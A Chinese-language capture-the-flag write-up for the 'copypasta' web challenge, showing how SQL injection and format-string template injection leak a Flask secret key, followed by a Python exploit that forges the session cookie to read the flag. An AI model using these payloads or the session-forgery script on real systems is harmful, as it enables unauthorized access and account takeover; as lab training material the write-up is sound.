# copypasta
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4f6a587e-65c5-4e5c-b98f-39a21297138e)

## 解題
一個複製文產生器

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/139b1d1d-0ed3-4e37-9bf4-9c07b78e4aa9)

他會保存所有人在這個網頁生成的文章，裡面有一個文章含有 flag，我們要把牠撈出來。

但是兩個問題
1. 沒有該文章的 ID
2. 如果 session 裡面沒有該文章的 ID 他會 permission denied

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/c2c6746f-9e88-423f-a357-89e8b23ad2ee)

發現這邊有 `SQLi` 的漏洞

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/e65933f5-7d76-4ba1-9db6-186afdc4fd24)

這邊還有 `SSTI` 的漏洞

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a61b6ac4-0832-4066-be55-877c9acf7630)

因此思路會是：
1. 用 SQLi 生成一個帶有 SSTI payload 的模板並生成文章
2. 利用這個文章的 SSTI 把 session 的 `secret_key` leak 出來
3. 用 SQLi 生成一個模板，裡面有 flag page id 的資料
4. 用 leak 出來 的 `secret_key` 修改 session
5. 讀取 flag page

於是構建出 SSTI payload `field.__init__.__globals__[http]._dt_as_utc.__globals__[sys].modules[flask].current_app.secret_key`

然後搭配 SQLi 得到這個 payload ` union SELECT 0 as id, 'ans' as title, '{field.__init__.__globals__[http]._dt_as_utc.__globals__[sys].modules[flask].current_app.secret_key}' as template`

還有 dump flag page id 的 SQLi payload ` union SELECT id, id as title, id as template from copypasta where orig_id=3`

## exploit
```python
import requests
import sys
import urllib.parse
import hashlib
from bs4 import BeautifulSoup
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import *

session = requests.session()

sqli = " union SELECT 0 as id, 'ans' as title, '{field.__init__.__globals__[http]._dt_as_utc.__globals__[sys].modules[flask].current_app.secret_key}' as template"

session.get(f'{sys.argv[1]}')
data = session.post(f'{sys.argv[1]}/use?id=0{urllib.parse.quote(sqli, safe="")}', params={'a': 'a'}).text

secret_key = BeautifulSoup(data, "html.parser").article.get_text()
print(f'secret_key: {secret_key}')

sqli = " union SELECT id, id as title, id as template from copypasta where orig_id=3"
data = session.get(f'{sys.argv[1]}/use?id=0{urllib.parse.quote(sqli, safe="")}').text

flagid = BeautifulSoup(data, "html.parser").pre.get_text()
print(f'flagid: {flagid}')

for a in session.cookies:
    if a.name == 'session':
        nowsession = a
        break

serializer = URLSafeTimedSerializer(secret_key=secret_key,
                  salt='cookie-session',
                  serializer=TaggedJSONSerializer(),
                  signer_kwargs={
                      'key_derivation': 'hmac',
                      'digest_method': hashlib.sha1,
                  })

sessiondata = serializer.loads(nowsession.value)
sessiondata['posts'].append(flagid)
session.cookies.set(nowsession.name, serializer.dumps(sessiondata), domain=nowsession.domain, path=nowsession.path)

print(session.get(f'{sys.argv[1]}/view/{flagid}').text)
```

## Flag
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a4b2e738-1171-4938-abc6-14c7857e024a)

`AIS3{I_l0Ve_P@$tA_@ND_cOpypasta}`
